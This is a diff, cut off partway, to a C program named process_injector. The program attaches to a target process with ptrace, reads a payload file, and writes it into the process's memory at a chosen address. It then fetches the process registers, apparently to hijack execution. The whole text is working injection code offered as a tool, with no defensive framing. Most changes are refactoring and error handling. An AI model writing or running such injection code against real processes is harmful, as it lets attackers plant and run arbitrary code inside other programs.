@@ -8,32 +8,41 @@
 
 int main(int argc, char **argv) {
 
-    int ret_val = 0;
+    size_t ret_val = 0;
+    size_t pid;
+    size_t address;
+    char *path;
+    size_t fd;
+    unsigned char tmp[8];
+
+    struct user_regs_struct regs;
 
     if (argc != 4) {
-        perror("Usage: ./process_injector <target_pid> <memory_addr> <payload>");
+        dprintf(STDERR_FILENO, "Usage: ./process_injector <target_pid> <memory_addr> <payload>");
         ret_val = 1;
         goto out;
     }
 
-    int pid = atoi(argv[1]);
-    long address = strtol(argv[2], NULL, 0);
-    char *path = argv[3];
+    pid = atoi(argv[1]);
+    address = strtol(argv[2], NULL, 0);
+    path = argv[3];
 
-    int fd = open(path, O_RDONLY);
+    fd = open(path, O_RDONLY);
+    if (fd == -1) {
+        perror("Open: ");
+        ret_val = 1;
+        goto out;
+    }
 
     ptrace(PTRACE_ATTACH, pid, NULL, NULL);
     wait(NULL);
 
-    signed char tmp[8];
-
-    for (size_t i = 0; i < 1000; i += 8) 
+    size_t i = 0;
+    while (read(fd, tmp, 8)) 
     {
-        if (read(fd, tmp, 8))
-            ptrace(PTRACE_POKETEXT, pid, address + i, *(long *)tmp);
+        ptrace(PTRACE_POKETEXT, pid, address + i, *(long *)tmp);
+        i += 8;
     }
-
-    struct user_regs_struct regs;
 
     ptrace(PTRACE_GETREGS, pid, NULL, &regs);
 
